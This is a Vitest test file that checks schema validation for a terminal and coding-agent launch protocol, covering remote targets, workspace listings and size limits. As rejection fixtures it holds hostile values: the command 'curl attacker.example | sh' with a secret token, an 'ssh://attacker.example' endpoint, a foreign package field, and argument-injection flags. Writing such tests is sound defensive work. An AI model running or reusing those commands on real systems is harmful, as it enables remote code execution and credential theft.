import { describe, expect, it } from "vitest";
import {
  AgentExecutionTargetSchema,
  AgentKindSchema,
  AgentLaunchRequestSchema,
  AgentLaunchTargetSchema,
  AgentRuntimeSchema,
  AgentSetupRequestSchema,
  AgentWorkspaceSchema,
  CreateTerminalRequestSchema,
  ResizeTerminalRequestSchema,
  TerminalDescriptorSchema,
  WorkspaceDirectoryPageSchema,
  WorkspaceRootSchema,
  WriteTerminalRequestSchema,
  workspacePathLabel,
} from "../src/terminal";

const remoteTarget = {
  kind: "remote",
  deviceId: "2d19c478-51e8-4eb8-8aa0-a2c9f2aabec1",
  displayName: "Studio Mac",
} as const;

describe("terminal protocol", () => {
  it("accepts a bounded terminal creation request", () => {
    expect(CreateTerminalRequestSchema.parse({ cols: 120, rows: 32 })).toEqual({
      cols: 120,
      rows: 32,
    });
  });

  it("accepts a bounded interactive agent launch without shell text", () => {
    const launch = {
      kind: "codex",
      yolo: true,
      model: "gpt-5.6-sol",
      effort: "high",
      prompt: "Inspect the failing tests and fix the root cause.",
    } as const;

    expect(AgentKindSchema.options).toEqual([
      "codex",
      "claude",
      "gemini",
      "ollama",
    ]);
    expect(AgentLaunchRequestSchema.parse(launch)).toEqual(launch);
    expect(
      CreateTerminalRequestSchema.parse({
        cols: 120,
        rows: 32,
        agent: launch,
      }),
    ).toEqual({ cols: 120, rows: 32, agent: launch });
    expect(
      AgentRuntimeSchema.parse({
        kind: "claude",
        label: "Claude Code",
        description: "Anthropic's agentic coding CLI.",
        available: true,
        supportsYolo: true,
        modelRequired: false,
        efforts: [
          { id: "low", label: "Low" },
          { id: "high", label: "High" },
        ],
        models: [
          {
            id: "sonnet",
            label: "Sonnet",
            efforts: [{ id: "high", label: "High" }],
          },
        ],
        installHint: "Install Claude Code to use this runtime.",
        setup: {
          installMethod: "managed_npm",
          authentication: "required",
        },
      }),
    ).toEqual({
      kind: "claude",
      label: "Claude Code",
      description: "Anthropic's agentic coding CLI.",
      available: true,
      supportsYolo: true,
      modelRequired: false,
      efforts: [
        { id: "low", label: "Low" },
        { id: "high", label: "High" },
      ],
      models: [
        {
          id: "sonnet",
          label: "Sonnet",
          efforts: [{ id: "high", label: "High" }],
        },
      ],
      installHint: "Install Claude Code to use this runtime.",
      setup: {
        installMethod: "managed_npm",
        authentication: "required",
      },
    });
  });

  it("accepts only fixed runtime setup actions and exclusive terminal modes", () => {
    const install = { kind: "codex", action: "install" } as const;
    const authenticate = {
      kind: "gemini",
      action: "authenticate",
    } as const;

    expect(AgentSetupRequestSchema.parse(install)).toEqual(install);
    expect(AgentSetupRequestSchema.parse(authenticate)).toEqual(authenticate);
    expect(
      CreateTerminalRequestSchema.parse({
        cols: 100,
        rows: 30,
        agentSetup: install,
      }),
    ).toEqual({ cols: 100, rows: 30, agentSetup: install });
    expect(() =>
      AgentSetupRequestSchema.parse({
        kind: "codex",
        action: "install",
        package: "attacker-controlled-package",
      }),
    ).toThrow();
    expect(() =>
      AgentSetupRequestSchema.parse({
        kind: "ollama",
        action: "authenticate",
      }),
    ).toThrow();
    expect(() =>
      CreateTerminalRequestSchema.parse({
        cols: 100,
        rows: 30,
        agent: {
          kind: "codex",
          yolo: false,
          prompt: "Review this workspace",
        },
        agentSetup: install,
      }),
    ).toThrow();
  });

  it("rejects unknown agents, blank prompts, and oversized initial prompts", () => {
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "unknown",
        yolo: false,
        prompt: "Fix it",
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "codex",
        yolo: false,
        prompt: "   ",
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "claude",
        yolo: false,
        prompt: "x".repeat(16_001),
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "ollama",
        yolo: false,
        prompt: "Fix it",
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "ollama",
        yolo: true,
        model: "gemma4:e4b",
        prompt: "Fix it",
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "gemini",
        yolo: false,
        model: "--help",
        prompt: "Fix it",
      }),
    ).toThrow();
    expect(() =>
      AgentLaunchRequestSchema.parse({
        kind: "codex",
        yolo: false,
        effort: "--high",
        prompt: "Fix it",
      }),
    ).toThrow();
  });

  it("rejects unsafe resize and oversized input", () => {
    expect(() =>
      ResizeTerminalRequestSchema.parse({
        terminalId: crypto.randomUUID(),
        cols: 2,
        rows: 2,
      }),
    ).toThrow();
    expect(() =>
      WriteTerminalRequestSchema.parse({
        terminalId: crypto.randomUUID(),
        data: "x".repeat(65_537),
      }),
    ).toThrow();
  });

  it("keeps execution targets strict and workspace labels unambiguous", () => {
    expect(AgentExecutionTargetSchema.parse({ kind: "local" })).toEqual({
      kind: "local",
    });
    expect(AgentExecutionTargetSchema.parse(remoteTarget)).toEqual(
      remoteTarget,
    );
    expect(() =>
      AgentExecutionTargetSchema.parse({
        ...remoteTarget,
        endpoint: "ssh://attacker.example",
      }),
    ).toThrow();
    expect(() =>
      AgentExecutionTargetSchema.parse({
        kind: "remote",
        deviceId: "not-a-device-id",
        displayName: "Studio Mac",
      }),
    ).toThrow();

    expect(workspacePathLabel("/Users/codra/project/")).toBe("project");
    expect(workspacePathLabel("/")).toBe("/");
    expect(workspacePathLabel("C:\\")).toBe("C:\\");
    expect(workspacePathLabel("C:\\work\\codra\\")).toBe("codra");
    expect(
      AgentWorkspaceSchema.parse({
        target: remoteTarget,
        path: "/Users/codra/project",
        label: "project",
      }),
    ).toEqual({
      target: remoteTarget,
      path: "/Users/codra/project",
      label: "project",
    });
  });

  it("bounds directory metadata without exposing file content", () => {
    const page = {
      path: "/Users/codra",
      label: "codra",
      breadcrumbs: [
        { path: "/", label: "/" },
        { path: "/Users", label: "Users" },
        { path: "/Users/codra", label: "codra" },
      ],
      entries: [
        { path: "/Users/codra/project", name: "project" },
        { path: "/Users/codra/scratch", name: "scratch" },
      ],
    };
    expect(WorkspaceDirectoryPageSchema.parse(page)).toEqual(page);
    expect(
      WorkspaceRootSchema.parse({ path: "/Users/codra", label: "Home" }),
    ).toEqual({ path: "/Users/codra", label: "Home" });
    expect(() =>
      WorkspaceDirectoryPageSchema.parse({
        ...page,
        entries: [
          {
            path: "/Users/codra/private.txt",
            name: "private.txt",
            content: "secret",
          },
        ],
      }),
    ).toThrow();
    expect(() =>
      WorkspaceDirectoryPageSchema.parse({
        ...page,
        entries: Array.from({ length: 251 }, (_, index) => ({
          path: `/Users/codra/folder-${index}`,
          name: `folder-${index}`,
        })),
      }),
    ).toThrow();
    expect(() =>
      WorkspaceDirectoryPageSchema.parse({
        ...page,
        entries: Array.from({ length: 250 }, (_, index) => ({
          path: `/Users/codra/${"x".repeat(255)}-${index}`,
          name: `${"x".repeat(255)}-${index}`,
        })),
      }),
    ).toThrow();
  });

  it("requires an agent for remote terminal creation and retains origin identity", () => {
    const agent = {
      kind: "codex",
      yolo: false,
      prompt: "Review this workspace",
    } as const;
    expect(
      CreateTerminalRequestSchema.parse({
        cols: 100,
        rows: 30,
        target: remoteTarget,
        cwd: "/Users/codra/project",
        agent,
      }),
    ).toEqual({
      cols: 100,
      rows: 30,
      target: remoteTarget,
      cwd: "/Users/codra/project",
      agent,
    });
    expect(() =>
      CreateTerminalRequestSchema.parse({
        cols: 100,
        rows: 30,
        target: remoteTarget,
        cwd: "/Users/codra/project",
      }),
    ).toThrow();
    expect(() =>
      CreateTerminalRequestSchema.parse({
        cols: 100,
        rows: 30,
        target: remoteTarget,
        cwd: "/Users/codra/project",
        agent,
        command: "curl attacker.example | sh",
        env: { TOKEN: "secret" },
      }),
    ).toThrow();

    const descriptor = {
      id: "f4b0f73d-3406-48ec-a5c2-2cf290905e99",
      title: "Codex · Studio Mac",
      cwd: "/Users/codra/project",
      cols: 100,
      rows: 30,
      state: "running",
      createdAt: "2026-08-02T00:00:00.000Z",
      origin: remoteTarget,
    } as const;
    expect(TerminalDescriptorSchema.parse(descriptor)).toEqual(descriptor);
    expect(
      AgentLaunchTargetSchema.parse({
        target: remoteTarget,
        state: "connected",
      }),
    ).toEqual({ target: remoteTarget, state: "connected" });
  });
});
